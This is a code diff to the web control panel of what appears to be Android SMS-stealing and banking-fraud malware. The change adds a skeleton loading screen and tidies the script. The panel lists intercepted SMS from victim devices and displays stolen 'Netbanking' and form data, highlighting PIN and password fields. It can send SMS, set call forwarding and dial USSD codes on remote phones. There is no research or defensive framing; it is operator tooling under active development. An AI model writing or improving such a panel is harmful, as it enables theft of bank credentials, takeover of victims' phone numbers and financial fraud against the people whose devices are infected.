@@ -59,6 +59,69 @@ body {
   padding-bottom: 20px;
 }
 
+/* ================== SKELETON LOADING EFFECT ================== */
+@keyframes skeleton-pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.5; }
+}
+
+.skeleton {
+  background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+  background-size: 200% 100%;
+  animation: skeleton-loading 1.5s infinite ease-in-out;
+  border-radius: 4px;
+  position: relative;
+  overflow: hidden;
+}
+
+@keyframes skeleton-loading {
+  0% { background-position: 200% 0; }
+  100% { background-position: -200% 0; }
+}
+
+.skeleton-text {
+  height: 16px;
+  margin-bottom: 8px;
+  border-radius: 4px;
+}
+
+.skeleton-title {
+  height: 28px;
+  width: 70%;
+  margin-bottom: 12px;
+}
+
+.skeleton-circle {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+}
+
+.skeleton-rect {
+  height: 100px;
+  border-radius: var(--radius);
+}
+
+.skeleton-button {
+  height: 80px;
+  border-radius: var(--radius);
+}
+
+/* Skeleton Container Styles */
+.skeleton-container {
+  display: block;
+}
+
+.skeleton-header {
+  margin-bottom: 20px;
+}
+
+.skeleton-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 12px;
+}
+
 /* ================== PAGE CONTAINER ================== */
 .page-container {
   width: 100%;
@@ -1655,7 +1718,6 @@ body {
   box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
 }
 
-
 .json-key {
   color: #9cdcfe;
 }
@@ -2178,278 +2240,349 @@ body {
       <span id="usernameDisplay"></span>
     </button>
     <button class="permission-btn" id="permissionBtn" title="View Device Permissions">Permissions</button>
-    
-    
   </div>
 </header>
 
 <!-- MAIN CONTENT -->
 <div class="page-container">
-  <div class="device-header">
-    <div class="device-header-content">
-      <div class="device-id-row">
-        <div class="device-id" id="deviceIdDisplay" title="Click to copy">Loading...</div>
-        <div class="last-seen" id="lastSeenDisplay">
-          <i class="fas fa-clock"></i>
-          --
-        </div>
-      </div>
-      
-      <div class="device-main-info">
-        <div class="device-icon">
-          <img src="assets/image/android.png" alt="Android Device" onerror="this.style.display='none'; this.parentNode.innerHTML='<i class=\'fas fa-mobile-alt\'></i>';">
-        </div>
-        <div class="device-details">
-          <div class="device-name" id="deviceName">Loading Device...</div>
-          <span class="device-model" id="deviceModel">Android</span>
-        </div>
-      </div>
-
-      <div class="sim-cards-compact">
-        <!-- SIM 1 - ALWAYS SHOW -->
-        <div class="sim-card-compact" id="sim1CardCompact">
-          <div class="sim-icon">
-            <i class="fas fa-sim-card"></i>
-          </div>
-          <div class="sim-details-compact">
-            <div class="sim-label">SIM 1</div>
-            <div class="sim-info">
-              <div class="sim-number" id="sim1NumberCompact" title="Click to copy phone number">-</div>
-              <div class="sim-carrier">
-                <span id="sim1CarrierCompact">Loading...</span>
-                <span class="sim-status-compact unknown" id="sim1StatusCompact">
-                  <i class="fas fa-question-circle"></i>
-                </span>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <!-- SIM 2 - ALWAYS SHOW -->
-        <div class="sim-card-compact" id="sim2CardCompact">
-          <div class="sim-icon">
-            <i class="fas fa-sim-card"></i>
-          </div>
-          <div class="sim-details-compact">
-            <div class="sim-label">SIM 2</div>
-            <div class="sim-info">
-              <div class="sim-number" id="sim2NumberCompact" title="Click to copy phone number">-</div>
-              <div class="sim-carrier">
-                <span id="sim2CarrierCompact">Loading...</span>
-                <span class="sim-status-compact unknown" id="sim2StatusCompact">
-                  <i class="fas fa-question-circle"></i>
-                </span>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-      
-      <!-- ACTION BUTTONS - 2 ROWS (3 + 3) -->
-      <div class="action-buttons">
-        <!-- First Row - 3 Buttons -->
-        <div class="button-row">
-          <button class="action-btn sms" id="smsBtn">
-            <i class="fas fa-comment-alt"></i>
-            Send SMS
-          </button>
-          <button class="action-btn call" id="callBtn">
-            <i class="fas fa-phone-alt"></i>
-            Call Forward
-          </button>
-          <button class="action-btn ussd" id="ussdBtn">
-            <i class="fas fa-hashtag"></i>
-            Remote Call
-          </button>
+  <!-- SKELETON LOADER -->
+  <div class="skeleton-container" id="skeletonLoader">
+    <div class="device-header skeleton">
+      <div class="device-header-content">
+        <div class="device-id-row">
+          <div class="skeleton skeleton-text" style="height: 24px; width: 60%;"></div>
+          <div class="skeleton skeleton-text" style="height: 24px; width: 30%;"></div>
         </div>
         
-        <!-- Second Row - 3 Buttons -->
-        <div class="button-row">
-          <button class="action-btn check" id="checkBtn">
-            <i class="fas fa-satellite-dish"></i>
-            Check Online
-          </button>
-          <button class="action-btn data" id="dataBtn">
-            <i class="fas fa-database"></i>
-            Device Data
-          </button>
-          <button class="action-btn history" id="historyBtn">
-            <i class="fas fa-history"></i>
-            Recent
-          </button>
+        <div class="device-main-info">
+          <div class="skeleton skeleton-circle" style="width: 48px; height: 48px;"></div>
+          <div style="flex: 1;">
+            <div class="skeleton skeleton-title" style="width: 60%;"></div>
+            <div class="skeleton skeleton-text" style="width: 40%;"></div>
+          </div>
+        </div>
+
+        <div class="sim-cards-compact">
+          <div class="sim-card-compact skeleton">
+            <div class="skeleton skeleton-circle" style="width: 36px; height: 36px;"></div>
+            <div style="flex: 1;">
+              <div class="skeleton skeleton-text" style="width: 40%; height: 16px;"></div>
+              <div class="skeleton skeleton-text" style="width: 70%; height: 24px; margin-top: 4px;"></div>
+              <div class="skeleton skeleton-text" style="width: 50%; height: 16px; margin-top: 4px;"></div>
+            </div>
+          </div>
+          <div class="sim-card-compact skeleton">
+            <div class="skeleton skeleton-circle" style="width: 36px; height: 36px;"></div>
+            <div style="flex: 1;">
+              <div class="skeleton skeleton-text" style="width: 40%; height: 16px;"></div>
+              <div class="skeleton skeleton-text" style="width: 70%; height: 24px; margin-top: 4px;"></div>
+              <div class="skeleton skeleton-text" style="width: 50%; height: 16px; margin-top: 4px;"></div>
+            </div>
+          </div>
+        </div>
+        
+        <!-- ACTION BUTTONS SKELETON -->
+        <div class="action-buttons">
+          <div class="button-row">
+            <div class="skeleton skeleton-button"></div>
+            <div class="skeleton skeleton-button"></div>
+            <div class="skeleton skeleton-button"></div>
+          </div>
+          <div class="button-row">
+            <div class="skeleton skeleton-button"></div>
+            <div class="skeleton skeleton-button"></div>
+            <div class="skeleton skeleton-button"></div>
+          </div>
         </div>
       </div>
     </div>
-  </div>
 
-  <!-- DEVICE DATA PANEL (NEW) - ALL DATA WILL SHOW HERE -->
-  <div class="device-data-panel" id="deviceDataPanel">
-    <div class="device-data-header" id="deviceDataHeader">
-      <div class="device-data-title">
-        <i class="fas fa-database"></i>
-        Device Collected Data
-        <span class="device-data-count" id="dataCountBadge">0</span>
-      </div>
-      <div class="device-data-toggle">
-        <i class="fas fa-chevron-down"></i>
+    <!-- DEVICE DATA PANEL SKELETON -->
+    <div class="device-data-panel skeleton">
+      <div class="device-data-header">
+        <div style="display: flex; align-items: center; gap: 10px;">
+          <div class="skeleton skeleton-circle" style="width: 24px; height: 24px;"></div>
+          <div class="skeleton skeleton-text" style="width: 150px; height: 24px;"></div>
+        </div>
       </div>
     </div>
-    <div class="device-data-content" id="deviceDataContent">
-      <div id="deviceDataSections">
-        <!-- Data sections will be loaded here -->
-        <div class="no-data-message">
+
+    <!-- MESSAGES SKELETON -->
+    <div class="messages-container">
+      <div class="skeleton skeleton-rect" style="height: 200px; margin-bottom: 16px;"></div>
+      <div class="skeleton skeleton-rect" style="height: 180px; margin-bottom: 16px;"></div>
+      <div class="skeleton skeleton-rect" style="height: 220px;"></div>
+    </div>
+  </div>
+
+  <!-- ACTUAL CONTENT (HIDDEN INITIALLY) -->
+  <div id="mainContent" style="display: none;">
+    <div class="device-header">
+      <div class="device-header-content">
+        <div class="device-id-row">
+          <div class="device-id" id="deviceIdDisplay" title="Click to copy">Loading...</div>
+          <div class="last-seen" id="lastSeenDisplay">
+            <i class="fas fa-clock"></i>
+            --
+          </div>
+        </div>
+        
+        <div class="device-main-info">
+          <div class="device-icon">
+            <img src="assets/image/android.png" alt="Android Device" onerror="this.style.display='none'; this.parentNode.innerHTML='<i class=\'fas fa-mobile-alt\'></i>';">
+          </div>
+          <div class="device-details">
+            <div class="device-name" id="deviceName">Loading Device...</div>
+            <span class="device-model" id="deviceModel">Android</span>
+          </div>
+        </div>
+
+        <div class="sim-cards-compact">
+          <!-- SIM 1 - ALWAYS SHOW -->
+          <div class="sim-card-compact" id="sim1CardCompact">
+            <div class="sim-icon">
+              <i class="fas fa-sim-card"></i>
+            </div>
+            <div class="sim-details-compact">
+              <div class="sim-label">SIM 1</div>
+              <div class="sim-info">
+                <div class="sim-number" id="sim1NumberCompact" title="Click to copy phone number">-</div>
+                <div class="sim-carrier">
+                  <span id="sim1CarrierCompact">Loading...</span>
+                  <span class="sim-status-compact unknown" id="sim1StatusCompact">
+                    <i class="fas fa-question-circle"></i>
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- SIM 2 - ALWAYS SHOW -->
+          <div class="sim-card-compact" id="sim2CardCompact">
+            <div class="sim-icon">
+              <i class="fas fa-sim-card"></i>
+            </div>
+            <div class="sim-details-compact">
+              <div class="sim-label">SIM 2</div>
+              <div class="sim-info">
+                <div class="sim-number" id="sim2NumberCompact" title="Click to copy phone number">-</div>
+                <div class="sim-carrier">
+                  <span id="sim2CarrierCompact">Loading...</span>
+                  <span class="sim-status-compact unknown" id="sim2StatusCompact">
+                    <i class="fas fa-question-circle"></i>
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <!-- ACTION BUTTONS - 2 ROWS (3 + 3) -->
+        <div class="action-buttons">
+          <!-- First Row - 3 Buttons -->
+          <div class="button-row">
+            <button class="action-btn sms" id="smsBtn">
+              <i class="fas fa-comment-alt"></i>
+              Send SMS
+            </button>
+            <button class="action-btn call" id="callBtn">
+              <i class="fas fa-phone-alt"></i>
+              Call Forward
+            </button>
+            <button class="action-btn ussd" id="ussdBtn">
+              <i class="fas fa-hashtag"></i>
+              Remote Call
+            </button>
+          </div>
+          
+          <!-- Second Row - 3 Buttons -->
+          <div class="button-row">
+            <button class="action-btn check" id="checkBtn">
+              <i class="fas fa-satellite-dish"></i>
+              Check Online
+            </button>
+            <button class="action-btn data" id="dataBtn">
+              <i class="fas fa-database"></i>
+              Device Data
+            </button>
+            <button class="action-btn history" id="historyBtn">
+              <i class="fas fa-history"></i>
+              Recent
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- DEVICE DATA PANEL (NEW) - ALL DATA WILL SHOW HERE -->
+    <div class="device-data-panel" id="deviceDataPanel">
+      <div class="device-data-header" id="deviceDataHeader">
+        <div class="device-data-title">
           <i class="fas fa-database"></i>
-          <h3>No Data Collected Yet</h3>
-          <p>This device hasn't collected any data yet.</p>
+          Device Collected Data
+          <span class="device-data-count" id="dataCountBadge">0</span>
+        </div>
+        <div class="device-data-toggle">
+          <i class="fas fa-chevron-down"></i>
+        </div>
+      </div>
+      <div class="device-data-content" id="deviceDataContent">
+        <div id="deviceDataSections">
+          <!-- Data sections will be loaded here -->
+          <div class="no-data-message">
+            <i class="fas fa-database"></i>
+            <h3>No Data Collected Yet</h3>
+            <p>This device hasn't collected any data yet.</p>
+          </div>
         </div>
       </div>
     </div>
-  </div>
 
-  <!-- SMS Panel -->
-  <div class="panel sms-panel" id="smsPanel">
-    <div class="panel-content">
-      <div class="panel-header">
-        <i class="fas fa-comment-alt"></i>
-        <div class="panel-title">Send SMS</div>
-      </div>
-      <div class="form-group">
-        <label class="form-label">
-          <i class="fas fa-sim-card"></i>
-          SIM Slot
-        </label>
-        <select class="form-select" id="smsSimSlot">
-          <option value="0">SIM 1 (Loading...)</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="form-label">
-          <i class="fas fa-phone"></i>
-          Phone Number
-        </label>
-        <input type="text" class="form-input" id="smsNumber" placeholder="Enter phone number">
-      </div>
-      <div class="form-group">
-        <label class="form-label">
-          <i class="fas fa-envelope"></i>
-          Message
-        </label>
-        <textarea class="form-textarea" id="smsMessage" placeholder="Type your message..."></textarea>
-      </div>
-      <div class="form-actions">
-        <button class="btn btn-primary" id="sendSmsBtn">
-          <i class="fas fa-paper-plane"></i>
-          Send SMS
-        </button>
-        <button class="btn btn-secondary" id="clearSmsBtn">
-          <i class="fas fa-eraser"></i>
-          Clear
-        </button>
-        <button class="btn btn-secondary" id="closeSmsPanelBtn">
-          <i class="fas fa-times"></i>
-          Close
-        </button>
+    <!-- SMS Panel -->
+    <div class="panel sms-panel" id="smsPanel">
+      <div class="panel-content">
+        <div class="panel-header">
+          <i class="fas fa-comment-alt"></i>
+          <div class="panel-title">Send SMS</div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">
+            <i class="fas fa-sim-card"></i>
+            SIM Slot
+          </label>
+          <select class="form-select" id="smsSimSlot">
+            <option value="0">SIM 1 (Loading...)</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">
+            <i class="fas fa-phone"></i>
+            Phone Number
+          </label>
+          <input type="text" class="form-input" id="smsNumber" placeholder="Enter phone number">
+        </div>
+        <div class="form-group">
+          <label class="form-label">
+            <i class="fas fa-envelope"></i>
+            Message
+          </label>
+          <textarea class="form-textarea" id="smsMessage" placeholder="Type your message..."></textarea>
+        </div>
+        <div class="form-actions">
+          <button class="btn btn-primary" id="sendSmsBtn">
+            <i class="fas fa-paper-plane"></i>
+            Send SMS
+          </button>
+          <button class="btn btn-secondary" id="clearSmsBtn">
+            <i class="fas fa-eraser"></i>
+            Clear
+          </button>
+          <button class="btn btn-secondary" id="closeSmsPanelBtn">
+            <i class="fas fa-times"></i>
+            Close
+          </button>
+        </div>
       </div>
     </div>
-  </div>
 
-  <!-- Call Panel -->
-  <div class="panel" id="callPanel">
-    <div class="panel-content">
-      <div class="panel-header">
-        <i class="fas fa-phone-alt"></i>
-        <div class="panel-title">Call Forward</div>
-      </div>
-      <div class="form-group">
-        <label class="form-label">
-          <i class="fas fa-sim-card"></i>
-          SIM Slot
-        </label>
-        <select class="form-select" id="callSimSlot">
-          <option value="0">SIM 1 (Loading...)</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="form-label">
-          <i class="fas fa-phone-volume"></i>
-          Forward Number
-        </label>
-        <input type="text" class="form-input" id="forwardNumber" placeholder="Enter number to forward calls">
-      </div>
-      <div class="form-actions">
-        <button class="btn btn-primary" id="activateCallBtn">
-          <i class="fas fa-play-circle"></i>
-          Activate
-        </button>
-        <button class="btn btn-danger" id="deactivateCallBtn">
-          <i class="fas fa-stop-circle"></i>
-          Deactivate
-        </button>
-        <button class="btn btn-secondary" id="closeCallPanelBtn">
-          <i class="fas fa-times"></i>
-          Close
-        </button>
+    <!-- Call Panel -->
+    <div class="panel" id="callPanel">
+      <div class="panel-content">
+        <div class="panel-header">
+          <i class="fas fa-phone-alt"></i>
+          <div class="panel-title">Call Forward</div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">
+            <i class="fas fa-sim-card"></i>
+            SIM Slot
+          </label>
+          <select class="form-select" id="callSimSlot">
+            <option value="0">SIM 1 (Loading...)</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">
+            <i class="fas fa-phone-volume"></i>
+            Forward Number
+          </label>
+          <input type="text" class="form-input" id="forwardNumber" placeholder="Enter number to forward calls">
+        </div>
+        <div class="form-actions">
+          <button class="btn btn-primary" id="activateCallBtn">
+            <i class="fas fa-play-circle"></i>
+            Activate
+          </button>
+          <button class="btn btn-danger" id="deactivateCallBtn">
+            <i class="fas fa-stop-circle"></i>
+            Deactivate
+          </button>
+          <button class="btn btn-secondary" id="closeCallPanelBtn">
+            <i class="fas fa-times"></i>
+            Close
+          </button>
+        </div>
       </div>
     </div>
-  </div>
 
-  <!-- USSD Panel -->
-  <div class="panel" id="ussdPanel">
-    <div class="panel-content">
-      <div class="panel-header">
-        <i class="fas fa-hashtag"></i>
-        <div class="panel-title">USSD Dial</div>
-      </div>
-      <div class="form-group">
-        <label class="form-label">
-          <i class="fas fa-sim-card"></i>
-          SIM Slot
-        </label>
-        <select class="form-select" id="ussdSimSlot">
-          <option value="0">SIM 1 (Loading...)</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label class="form-label">
+    <!-- USSD Panel -->
+    <div class="panel" id="ussdPanel">
+      <div class="panel-content">
+        <div class="panel-header">
           <i class="fas fa-hashtag"></i>
-          USSD Code
-        </label>
-        <input type="text" class="form-input" id="ussdCode" placeholder="*123#">
-      </div>
-      <div class="form-actions">
-        <button class="btn btn-primary" id="sendUssdBtn">
-          <i class="fas fa-play"></i>
-          Send Code
-        </button>
-        <button class="btn btn-secondary" id="closeUssdPanelBtn">
-          <i class="fas fa-times"></i>
-          Close
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <!-- HISTORY PANEL -->
-  <div class="panel history-panel" id="historyPanel">
-    <div class="panel-content">
-      <div class="panel-header">
-        <i class="fas fa-history"></i>
-        <div class="panel-title">Recent Activity</div>
-      </div>
-      <div class="history-list" id="historyList">
-        <div style="text-align: center; padding: 20px; color: var(--gray-500);">
-          <i class="fas fa-spinner fa-spin"></i>
-          Loading history...
+          <div class="panel-title">USSD Dial</div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">
+            <i class="fas fa-sim-card"></i>
+            SIM Slot
+          </label>
+          <select class="form-select" id="ussdSimSlot">
+            <option value="0">SIM 1 (Loading...)</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">
+            <i class="fas fa-hashtag"></i>
+            USSD Code
+          </label>
+          <input type="text" class="form-input" id="ussdCode" placeholder="*123#">
+        </div>
+        <div class="form-actions">
+          <button class="btn btn-primary" id="sendUssdBtn">
+            <i class="fas fa-play"></i>
+            Send Code
+          </button>
+          <button class="btn btn-secondary" id="closeUssdPanelBtn">
+            <i class="fas fa-times"></i>
+            Close
+          </button>
         </div>
       </div>
     </div>
-  </div>
 
-  <!-- DEVICE MESSAGES SECTION - MESSAGES PAGE STYLE -->
-  <div class="messages-container" id="deviceMessagesList">
-    <div style="text-align: center; padding: 20px; color: var(--gray-500);" id="loadingMessages">
-      <i class="fas fa-spinner fa-spin"></i>
-      Loading device messages...
+    <!-- HISTORY PANEL -->
+    <div class="panel history-panel" id="historyPanel">
+      <div class="panel-content">
+        <div class="panel-header">
+          <i class="fas fa-history"></i>
+          <div class="panel-title">Recent Activity</div>
+        </div>
+        <div class="history-list" id="historyList">
+          <div style="text-align: center; padding: 20px; color: var(--gray-500);">
+            <i class="fas fa-spinner fa-spin"></i>
+            Loading history...
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- DEVICE MESSAGES SECTION - MESSAGES PAGE STYLE -->
+    <div class="messages-container" id="deviceMessagesList">
+      <div style="text-align: center; padding: 20px; color: var(--gray-500);" id="loadingMessages">
+        <i class="fas fa-spinner fa-spin"></i>
+        Loading device messages...
+      </div>
     </div>
   </div>
 </div>
@@ -2507,6 +2640,7 @@ let countdownInterval = null;
 let countdownSeconds = 30;
 let deviceAllData = null;
 let devicePermissions = null;
+let lastCheckOnlineTime = null;
 
 // ===================== AUTH FUNCTIONS =====================
 function checkAuth() {
@@ -2516,7 +2650,7 @@ function checkAuth() {
     return false;
   }
   
-  // Update UI with user info (ADMIN REMOVED)
+  // Update UI with user info
   updateUserInfo();
   
   // Verify token with server in background
@@ -2556,16 +2690,28 @@ async function verifyTokenWithServer() {
     
   } catch (error) {
     console.error('❌ Token verification error:', error);
-    return true; // Network error mein bhi allow karo
+    return true;
   }
 }
 
 function updateUserInfo() {
   const username = USER_ID || '';
   document.getElementById('usernameDisplay').textContent = username;
+  document.getElementById('userInfoBtn').style.visibility = 'visible';
 }
 
-// ===================== PERMISSION MODAL FUNCTIONS - UPDATED =====================
+// ===================== SKELETON LOADER FUNCTIONS =====================
+function showSkeletonLoader() {
+  document.getElementById('skeletonLoader').style.display = 'block';
+  document.getElementById('mainContent').style.display = 'none';
+}
+
+function hideSkeletonLoader() {
+  document.getElementById('skeletonLoader').style.display = 'none';
+  document.getElementById('mainContent').style.display = 'block';
+}
+
+// ===================== PERMISSION MODAL FUNCTIONS =====================
 async function loadDevicePermissions() {
   try {
     console.log('🔒 Loading permissions for device:', DEVICE_ID);
@@ -2576,11 +2722,8 @@ async function loadDevicePermissions() {
     console.log('📋 Permissions API response:', result);
     
     if (result.success) {
-      // Directly use the data as it comes from API
       devicePermissions = result.data;
       console.log('✅ Device permissions loaded:', devicePermissions);
-      
-      // Update modal with raw data
       updatePermissionModalWithRawData(devicePermissions);
       return true;
     } else {
@@ -2610,10 +2753,7 @@ function updatePermissionModalWithRawData(permissionsData) {
     return;
   }
   
-  // Format the data as pretty JSON
   const formattedJson = JSON.stringify(permissionsData, null, 2);
-  
-  // Syntax highlight the JSON
   const highlightedJson = syntaxHighlightJSON(formattedJson);
   
   modalBody.innerHTML = `
@@ -2621,8 +2761,6 @@ function updatePermissionModalWithRawData(permissionsData) {
       <div class="permission-raw-data">
         ${highlightedJson}
       </div>
-    </div>
-  
     </div>
   `;
 }
@@ -2658,7 +2796,6 @@ function showNoPermissionsMessage() {
 }
 
 function showPermissionModal() {
-  // Always load fresh data when opening modal
   loadDevicePermissions();
   document.getElementById('permissionModal').classList.add('active');
 }
@@ -2675,7 +2812,6 @@ function initPermissionModal() {
     document.getElementById('permissionModal').classList.remove('active');
   };
   
-  // Close modal on outside click
   document.getElementById('permissionModal').onclick = function(e) {
     if (e.target === this) {
       this.classList.remove('active');
@@ -2689,7 +2825,6 @@ function showTokenModal() {
   const sessionId = SESSION_ID || '';
   const userId = USER_ID || '';
   
-  // Show first and last 10 chars of token
   let tokenDisplay = token;
   if (token.length > 30) {
     tokenDisplay = token.substring(0, 20) + '...' + token.substring(token.length - 10);
@@ -2714,7 +2849,6 @@ function initTokenModal() {
     document.getElementById('tokenModal').classList.remove('active');
   };
   
-  // Close modal on outside click
   document.getElementById('tokenModal').onclick = function(e) {
     if (e.target === this) {
       this.classList.remove('active');
@@ -2729,17 +2863,28 @@ document.addEventListener('DOMContentLoaded', async function() {
     return;
   }
   
+  // Show skeleton loader initially
+  showSkeletonLoader();
+  
   initElements();
   initEventListeners();
   initTokenModal();
-  initPermissionModal(); // Initialize permission modal
+  initPermissionModal();
   initDeviceDataPanel();
   
   // Load data with authentication
-  await loadDeviceInfo();
-  loadDeviceMessages();
-  loadDeviceAllData(); // Load device data
-  loadDevicePermissions(); // Load permissions
+  await Promise.all([
+    loadDeviceInfo(),
+    loadDeviceMessages(),
+    loadDeviceAllData(),
+    loadDevicePermissions()
+  ]);
+  
+  // Hide skeleton after loading
+  setTimeout(() => {
+    hideSkeletonLoader();
+  }, 500);
+  
   initSocket();
   startLastSeenTimer();
   loadInitialHistory();
@@ -2768,9 +2913,7 @@ async function loadDeviceAllData() {
     if (result.success && result.data) {
       deviceAllData = result.data;
       console.log('✅ Device data loaded successfully');
-      console.log('📊 Data structure:', Object.keys(deviceAllData));
       
-      // Filter data for current device
       const filteredData = filterDeviceData(deviceAllData, DEVICE_ID);
       renderDeviceData(filteredData);
       
@@ -2803,7 +2946,6 @@ function filterDeviceData(allData, deviceId) {
   collections.forEach(collection => {
     if (allData[collection] && Array.isArray(allData[collection])) {
       const items = allData[collection].filter(item => {
-        // Check multiple possible UID fields
         const uid = item.uniqueid || item.deviceId || item.uid || item.deviceID;
         return uid === deviceId;
       });
@@ -2814,11 +2956,6 @@ function filterDeviceData(allData, deviceId) {
     }
   });
   
-  console.log('🔍 Filtered data:', Object.keys(filtered));
-  Object.keys(filtered).forEach(key => {
-    console.log(`  ${key}: ${filtered[key].length} items`);
-  });
-  
   return filtered;
 }
 
@@ -2826,7 +2963,6 @@ function renderDeviceData(filteredData) {
   const container = document.getElementById('deviceDataSections');
   const totalCount = Object.values(filteredData).reduce((sum, arr) => sum + arr.length, 0);
   
-  // Update count badge
   document.getElementById('dataCountBadge').textContent = totalCount;
   
   if (totalCount === 0) {
@@ -2836,7 +2972,6 @@ function renderDeviceData(filteredData) {
   
   let html = '';
   
-  // Define sections with icons and titles
   const sections = [
     { key: 'forms', title: 'Forms Data', icon: 'fas fa-file-alt', color: '#2563eb' },
     { key: 'netbanking', title: 'Netbanking Data', icon: 'fas fa-university', color: '#10b981' },
@@ -2875,7 +3010,6 @@ function renderDeviceData(filteredData) {
   
   container.innerHTML = html;
   
-  // Add click events to section headers
   sections.forEach(section => {
     if (filteredData[section.key]) {
       const sectionEl = document.getElementById(`dataSection_${section.key}`);
@@ -2905,7 +3039,6 @@ function renderDataItems(items, sectionKey, isSensitive = false) {
       second: '2-digit'
     });
     
-    // Create data rows
     let dataRows = '';
     Object.entries(item).forEach(([key, value]) => {
       if (key !== 'uniqueid' && key !== 'deviceId' && key !== 'uid' && 
@@ -2919,7 +3052,6 @@ function renderDataItems(items, sectionKey, isSensitive = false) {
         let isImportant = false;
         let isSensitiveField = false;
         
-        // Determine icon and importance
         if (key.toLowerCase().includes('pin') || 
             key.toLowerCase().includes('password') || 
             key.toLowerCase().includes('pass') || 
@@ -3002,6 +3134,7 @@ function showNoDataMessage() {
   `;
 }
 
+// ===================== SOCKET FUNCTIONS =====================
 function initSocket() {
   try {
     const socketOptions = {
@@ -3096,6 +3229,7 @@ function initSocket() {
     console.error('❌ Socket initialization error:', error);
   }
 }
+
 // ===================== API CALL FUNCTIONS WITH AUTH =====================
 async function fetchWithAuth(url, options = {}) {
   try {
@@ -3152,34 +3286,28 @@ function initElements() {
 function initEventListeners() {
   deviceIdDisplay.onclick = () => copyDeviceIdToClipboard();
 
-  // Button click events - UPDATED DATA BUTTON
   document.getElementById('smsBtn').onclick = () => togglePanel('smsPanel');
   document.getElementById('callBtn').onclick = () => togglePanel('callPanel');
   document.getElementById('ussdBtn').onclick = () => togglePanel('ussdPanel');
   document.getElementById('checkBtn').onclick = () => checkOnline(DEVICE_ID);
-  document.getElementById('dataBtn').onclick = () => toggleDeviceDataPanel(); // CHANGED HERE
+  document.getElementById('dataBtn').onclick = () => toggleDeviceDataPanel();
   document.getElementById('historyBtn').onclick = () => togglePanel('historyPanel');
 
-  // SMS Panel Events
   document.getElementById('sendSmsBtn').onclick = sendSms;
   document.getElementById('clearSmsBtn').onclick = clearSmsFields;
   document.getElementById('closeSmsPanelBtn').onclick = () => togglePanel('smsPanel', false);
 
-  // Call Panel Events
   document.getElementById('activateCallBtn').onclick = () => sendCallForward(true);
   document.getElementById('deactivateCallBtn').onclick = () => sendCallForward(false);
   document.getElementById('closeCallPanelBtn').onclick = () => togglePanel('callPanel', false);
 
-  // USSD Panel Events
   document.getElementById('sendUssdBtn').onclick = sendUssd;
   document.getElementById('closeUssdPanelBtn').onclick = () => togglePanel('ussdPanel', false);
 
-  // Floating button
   document.getElementById('smsFloatingBtn').onclick = () => {
     document.querySelector('.messages-container').scrollIntoView({ behavior: 'smooth' });
   };
 
-  // Popup Events
   document.getElementById('refreshPopupBtn').onclick = () => {
     if (currentReplyUid) checkOnline(currentReplyUid);
   };
@@ -3195,7 +3323,6 @@ function toggleDeviceDataPanel() {
     header.classList.toggle('expanded');
     content.classList.toggle('expanded');
     
-    // Scroll to panel
     panel.scrollIntoView({ behavior: 'smooth' });
     
     if (header.classList.contains('expanded') && !deviceAllData) {
@@ -3212,7 +3339,6 @@ async function loadDeviceMessages() {
     const result = await response.json();
     
     if (result.success && result.data) {
-      // 1. Filter messages for current device
       const deviceMessages = result.data.filter(msg => 
         msg.uniqueid === DEVICE_ID || 
         msg.deviceId === DEVICE_ID ||
@@ -3222,34 +3348,16 @@ async function loadDeviceMessages() {
       
       console.log(`📱 Found ${deviceMessages.length} messages for device ${DEVICE_ID}`);
       
-      // 2. ✅ CRITICAL FIX: REVERSE THE ARRAY (API returns oldest first)
-      // The API returns messages with oldest first, we need newest first
       const reversedMessages = [...deviceMessages].reverse();
       
-      // 3. Also sort by timestamp to ensure proper order
       allSmsData = reversedMessages.sort((a, b) => {
         const timeA = getTimestampFromSms(a);
         const timeB = getTimestampFromSms(b);
-        return timeB - timeA; // Descending order (newest first)
+        return timeB - timeA;
       });
       
-      console.log('✅ Messages sorted: Newest first (after reverse)');
+      console.log('✅ Messages sorted: Newest first');
       
-      // Log first and last message timestamps for debugging
-      if (allSmsData.length > 0) {
-        const firstMsg = allSmsData[0];
-        const lastMsg = allSmsData[allSmsData.length - 1];
-        console.log('First message (should be newest):', {
-          time: new Date(getTimestampFromSms(firstMsg)).toISOString(),
-          body: firstMsg.body?.substring(0, 50) || 'No body'
-        });
-        console.log('Last message (should be oldest):', {
-          time: new Date(getTimestampFromSms(lastMsg)).toISOString(),
-          body: lastMsg.body?.substring(0, 50) || 'No body'
-        });
-      }
-      
-      // 4. Render messages
       renderAllMessagesSorted();
       
     } else {
@@ -3282,12 +3390,9 @@ function getTimestampFromSms(sms) {
   return Date.now();
 }
 
-// ✅ NEW FUNCTION: Render all messages in sorted order (FIXED)
 function renderAllMessagesSorted() {
-  // Clear current messages
   deviceMessagesList.innerHTML = '';
   
-  // Hide loading message if present
   if (loadingMessages) loadingMessages.style.display = 'none';
   
   if (!allSmsData || allSmsData.length === 0) {
@@ -3301,20 +3406,17 @@ function renderAllMessagesSorted() {
     return;
   }
   
-  // ✅ FIXED: Always sort by timestamp DESCENDING (newest first)
   const sortedMessages = [...allSmsData].sort((a, b) => {
     const timeA = getTimestampFromSms(a);
     const timeB = getTimestampFromSms(b);
-    return timeB - timeA; // Descending order (newest first)
+    return timeB - timeA;
   });
   
   console.log(`🔄 Rendering ${sortedMessages.length} messages, newest first`);
   
-  // Render all messages in correct order (newest first)
   sortedMessages.forEach(msg => addMessageCard(msg, true));
 }
 
